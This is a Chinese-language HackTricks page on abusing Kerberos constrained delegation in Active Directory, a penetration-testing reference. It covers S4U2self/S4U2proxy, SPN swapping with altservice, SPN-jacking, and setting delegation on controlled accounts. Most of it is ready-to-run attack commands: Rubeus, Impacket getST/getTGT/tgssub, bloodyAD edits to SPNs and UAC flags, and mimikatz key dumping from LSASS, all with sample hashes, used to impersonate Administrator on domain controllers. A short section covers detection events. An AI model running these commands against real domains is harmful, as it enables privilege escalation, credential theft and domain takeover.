# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

借助此功能，Domain admin 可以**允许**一台计算机针对某台机器上的任意**服务**，**impersonate 用户或计算机**。

- **Service for User to self (_S4U2self_)：**任何**拥有 SPN 的服务账户**通常都可以代表任意用户获取发给自身的 TGS。如果该账户的 _userAccountControl_ 中还设置了 [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)（T2A4D），那么该 TGS 就是**可转发的**，这使得协议转换对**经典 constrained delegation** 直接有用。
- **Service for User to Proxy（_S4U2proxy_）：** **服务账户**可以代表用户，向 **msDS-AllowedToDelegateTo** 中列出的 SPN 获取 TGS。S4U2Proxy 使用的证据票据必须是发给委派服务的**可转发**票据：可以是从受害者处捕获的真实客户端到服务票据，也可以是通过 **S4U2Self + T2A4D** 生成的票据。

**注意**：如果 AD 中某个用户被标记为“_Account is sensitive and cannot be delegated_”，或者该用户属于 **Protected Users**，通常就**无法通过 constrained delegation impersonate** 该用户。在现代域中，针对启用了委派的账户时，优先使用 **AES** 材料，而不要只假设使用 RC4。

这意味着，如果你**窃取了服务账户的 hash**，就可以 **impersonate 用户**，并代表他们访问指定机器上的任意**服务**（可能导致 **privesc**）。

此外，你**不仅能访问用户可以 impersonate 的服务，还能访问任意服务**，因为系统不会检查 SPN（即请求的服务名称）（票据中的这部分未加密或签名）。因此，如果你能访问 **CIFS 服务**，例如也可以使用 Rubeus 中的 `/altservice` 标志访问 **HOST 服务**。Impacket `getST -altservice` 等工具也会利用相同的 SPN 替换弱点。

此外，要利用 **DCSync**，需要拥有对 DC 上 **LDAP 服务**的访问权限。

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**操作人员提示：**不要仅凭 **ADUC** 或 BloodHound 截图审查 **gMSA/sMSA**。这些账户通常不会显示常见的 Delegation 选项卡，因此请直接枚举原始的 **`userAccountControl`** 和 **`msDS-AllowedToDelegateTo`** 属性。

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### 协议转换与仅 Kerberos 受限委派

如果被攻陷的账户具有 **T2A4D**，通常仅凭服务密钥/TGT 就能完成完整的 **`S4U2Self -> S4U2Proxy`** 链。<sup>[[2]](#references)</sup>

如果账户只有 **`msDS-AllowedToDelegateTo`**（经典的 **"Use Kerberos only"** 模式），委派仍可能被滥用，但 S4U2Proxy 的证据票据必须是发给委派服务的**可转发用户到服务票据**。一种方法是从 **LSASS/ccache** 捕获受害者的 TGS，并将其传入第二阶段（Rubeus 中使用 `/tgs:`）。对于经典受限委派，**不可转发**的 S4U2Self 票据**不够用**；如果这是你唯一的证据票据，请改查[基于资源的受限委派](resource-based-constrained-delegation.md)。<sup>[[2]](#references)</sup>

另一种有条件的路径是先通过 [RBCD](resource-based-constrained-delegation.md) 跳转到委派服务：如果它为目标用户和服务生成了**可转发**票据，就可以测试将该票据用作后续仅 Kerberos S4U2Proxy 跳转的证据。请确认第一个票据的标志、委派服务的 SPN、其目标允许列表，以及任何用户委派限制；仅控制 RBCD 属性并不能证明第二跳可行。

### 跨域受限委派说明（2025 年及以后）

自 **Windows Server 2012/2012 R2** 起，KDC 便通过 S4U2Proxy 扩展支持**跨域/林受限委派**。现代版本（Windows Server 2016–2025）保留了此行为，并增加了两个 PAC SID 来标识协议转换：<sup>[[1]](#references)</sup>

- `S-1-18-1`（**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**）：用户正常完成身份验证时使用。
- `S-1-18-2`（**SERVICE_ASSERTED_IDENTITY**）：服务通过协议转换声明该身份时使用。

跨域使用协议转换时，预期 PAC 中会包含 `SERVICE_ASSERTED_IDENTITY`，这可以确认 S4U2Proxy 步骤已成功。<sup>[[1]](#references)</sup>

### Impacket / Linux 工具（altservice 和完整 S4U）

近期版本的 Impacket（0.11.x+）提供了与 Rubeus 相同的 S4U 链和 SPN 置换功能：<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

如果你倾向于先伪造用户 ST（例如，手头只有离线 hash），可以将 **ticketer.py** 与 **getST.py** 配合用于 S4U2Proxy。如果已有可用的 ccache，且只需替换同一主机的 service class，**tgssub.py** 也很方便。有关当前存在的问题（伪造的 ST 与 SPN key 不匹配时出现 KRB_AP_ERR_MODIFIED），请参阅 Impacket issue #1713。<sup>[[2]](#references)</sup>

### SPN-jacking：重定向 constrained-delegation 目标

经典 constrained delegation 授权的是 `msDS-AllowedToDelegateTo` 中的 **SPN 字符串**，而非不可变的目标 SID。在 S4U2Proxy 期间，KDC 会解析当前拥有该 SPN 的账户，并使用该账户的长期密钥加密 service ticket。因此，控制委派账户并对另一个 service/computer 账户拥有 `WriteSPN` 权限，即可重定向现有委派约束，无需 `SeEnableDelegationPrivilege`。<sup>[[5]](#references)[[6]](#references)</sup>

有两种变体：<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking：**允许的 SPN 已成为孤儿，因为其原所有者已被删除、重命名，或移除了该 SPN。将它直接添加到所需的目标账户。
- **Live SPN-jacking：**该 SPN 仍属于源账户。重复 SPN 校验通常会阻止将其写入目标账户，因此需要对两个对象都拥有 `WriteSPN`：从源账户移除 SPN，将其添加到目标账户，获取 ticket，然后恢复原始注册。

以下经过抽象的 Linux 操作流程会迁移一个已允许的 SPN，以受控的委派主体身份运行 S4U，并将 ticket 的 service name 改写为新目标上的一个有用服务。<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` 是第二个独立原语。S4U2Proxy 票据是为当前拥有 `$DELEGATED_SPN` 的账户加密的；由于服务名称（`sname`）位于加密票据正文之外，工具可以将其替换为另一个服务类/主机名，前提是该服务使用相同的账户密钥。SPN-jacking 首先更改保护票据的**账户密钥**，而服务类替换则更改**票据的提交位置**。<sup>[[5]](#references)[[6]](#references)</sup>

对于实时 jacking，在获取票据后立即反向执行两次 LDAP 写入，以免中断合法服务。在启用了计算机账户审核的 DC 上，排查 Security 事件 **4742**：其中 `servicePrincipalName` 从一台计算机移除后，很快又被添加到另一台计算机上；特别留意 SPN 主机名与目标计算机的 `dNSHostName` 不同的情况。与事件 **4769** 进行关联：S4U2Self 会将同一账户同时作为客户端/服务，而 S4U2Proxy 会填充 **Transited Services**。<sup>[[5]](#references)</sup>

### 在受控账户上配置委派

此路径要求对计算机或服务账户的委派属性拥有**有效写入权限**（例如 `GenericAll`，或先拥有 `WriteDACL` 再更改 ACL），**并且**执行 LDAP 更改的账户具有 `SeEnableDelegationPrivilege` 用户权限。Microsoft 要求修改 `msDS-AllowedToDelegateTo` 时必须拥有此权限；仅有对象控制权限并不能绕过此要求。使用 **bloodyAD** 等 LDAP 客户端设置协议转换委派前，请确认这两个前提均已满足。<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

现有计算机帐户也可以作为候选对象，即使 `ms-DS-MachineAccountQuota` 为零；该配额限制的是默认的新建计算机流程，而不是对现有对象的权限。要使用已配置的委派，你还需要控制委派帐户的密钥或密码、有效的服务主体名称，以及凭据可委派的目标用户。这些条件和有效的目录访问权限必须分别检查。

- Step 1: **获取允许的服务的 TGT**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> 无需在计算机上获得 SYSTEM 权限，也有**其他方法可以获取 TGT ticket**，或获取 **RC4** 或 **AES256**，例如 Printer Bug、unconstrain delegation、NTLM relaying 和 Active Directory Certificate Service abuse
>
> **只要有该 TGT ticket（或其哈希），就可以在不攻陷整台计算机的情况下执行此攻击。**

- Step2: **获取 TGS，以该用户身份模拟访问服务**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**更多信息请见 ired.team。**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) 和 [**Kerberosity 杀死了域：Kerberos 攻击概述**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos 受限委派概述 (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [使用 Impacket 滥用委派（第 2 部分）：受限委派 (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos 受限委派 (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity 杀死了域：Kerberos 攻击概述 (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking：WriteSPN 滥用中的边缘案例](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
